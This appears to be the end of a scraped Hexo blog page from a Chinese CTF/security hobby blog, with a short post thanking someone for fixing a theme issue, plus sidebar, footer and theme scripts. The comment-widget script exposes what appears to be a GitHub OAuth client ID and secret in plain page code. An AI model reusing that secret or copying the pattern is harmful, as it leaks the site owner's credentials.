problem</h1><blockquote>
<p>I used <a target="_blank" rel="noopener" href="https://github.com/removeif/hexo-theme-amazing">removeif&#x2F;hexo-theme-amazing</a></p>
</blockquote>
<p>He <strong>STFW</strong> and <strong>RTFM</strong> then he solved it.</p>
<h2 id="I-deeply-apperciate-his-generous-assistance"><a href="#I-deeply-apperciate-his-generous-assistance" class="headerlink" title="I deeply apperciate his generous assistance."></a>I deeply apperciate his generous assistance.</h2><p>His blog is at <a target="_blank" rel="noopener" href="https://googles.plus/">googles.plus</a></p>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/Hexo/">Hexo</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/Troubleshooting/">Troubleshooting</a></div><hr></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="UPON-2021"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">UPON-2021</p><p class="is-size-6 is-block">游走于 web2 &amp; web3 的嘿阔 (很菜)</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">14</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/upon-2021" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/upon-2021/"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="/%E8%AF%B6%E5%98%BF%EF%BC%9F"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Next" href="/%E5%96%B5%E5%96%B5%E5%96%B5%EF%BC%9F"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.google.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">谷歌</span></span><span class="level-right"><span class="level-item tag">www.google.com</span></span></a></li><li><a class="level is-mobile" href="https://www.baidu.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">百度</span></span><span class="level-right"><span class="level-item tag">www.baidu.com</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新评论</h3><span class="body_hot_comment">加载中，最新评论有1分钟缓存...</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-15T12:02:34.939Z">2022-10-15</time></p><p class="title"><a href="/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/">SQL注入备忘录</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-12T11:16:33.486Z">2022-10-12</time></p><p class="title"><a href="/2022/10/12/HNctf/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-10T11:02:47.418Z">2022-10-10</time></p><p class="title"><a href="/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/">BUU做题寄录</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-06T02:05:56.986Z">2022-10-06</time></p><p class="title"><a href="/2022/10/06/sql/">SQL注入学习寄录</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-04T12:45:21.957Z">2022-10-04</time></p><p class="title"><a href="/2022/10/04/solidity/">Ethernaut刷题记录</a></p></div></article></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2022/10/"><span class="level-start"><span class="level-item">十月 2022</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/09/"><span class="level-start"><span class="level-item">九月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WEB/"><span class="tag">WEB</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Blockchain/"><span class="tag">Blockchain</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ETH/"><span class="tag">ETH</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hexo/"><span class="tag">Hexo</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL/"><span class="tag">SQL</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Solidity/"><span class="tag">Solidity</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Troubleshooting/"><span class="tag">Troubleshooting</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/inject/"><span class="tag">inject</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/phar/"><span class="tag">phar</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%8D%E7%8E%B0/"><span class="tag">复现</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="UPONのblog" height="28"></a><p class="size-small"><span>&copy; 2022 UPON2021</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！";
        }var now = new Date();setInterval("createTime('2022/9/29 17:30:00')", 250,"");</script><br></span><div class="size-small"><span></span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('be835d1ee57b9ec974c1','5b2d7f351be105e013f11fa0ebde21cbea192152','UPON-2021','upon-2021.github.io',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(true){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('be835d1ee57b9ec974c1','5b2d7f351be105e013f11fa0ebde21cbea192152','UPON-2021','upon-2021.github.io',false);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>